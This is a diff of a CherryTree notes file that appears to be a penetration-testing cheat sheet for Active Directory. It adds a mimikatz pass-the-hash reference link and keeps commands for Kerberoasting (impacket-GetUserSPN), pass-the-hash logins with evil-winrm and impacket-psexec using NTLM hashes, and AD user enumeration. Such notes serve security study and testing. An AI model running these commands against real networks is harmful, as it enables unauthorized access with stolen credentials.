@@ -1547,7 +1547,7 @@ impacket-GetADUsers domain/user:password@IP</codebox>
             <codebox char_offset="35" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Impacket-GetUserSPN -request -dc-ip 10.11.1. domain.local/user</codebox>
           </node>
         </node>
-        <node name="Pass The Hash Attack" unique_id="39" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689619" ts_lastsave="1687690728">
+        <node name="Pass The Hash Attack" unique_id="39" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689619" ts_lastsave="1688335472">
           <rich_text>
 
 
@@ -1561,12 +1561,16 @@ or
           <rich_text justification="left"></rich_text>
           <rich_text>
 
+with mimikatz
+</rich_text>
+          <rich_text link="webs https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/">https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/</rich_text>
+          <rich_text>
+
 </rich_text>
           <codebox char_offset="3" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.11.1. -u Administrator -H 0e0363213e37b94221497260b0bcb4fc</codebox>
           <codebox char_offset="10" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  domain.local/admin@10.11.1. -hashes randomLMHASH:oeasdNTLMHASH</codebox>
-          <codebox char_offset="11" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
         </node>
-        <node name="Useful Powershell/CMD Commands" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689661" ts_lastsave="1688334861">
+        <node name="Useful Powershell/CMD Commands" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689661" ts_lastsave="1688335528">
           <rich_text>
 </rich_text>
           <rich_text scale="h2">
@@ -1699,6 +1703,10 @@ where ptt is pass the ticket
  
  
  
+ 
+ </rich_text>
+          <rich_text link="webs https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/">https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/</rich_text>
+          <rich_text>
  
  </rich_text>
           <rich_text family="monospace">
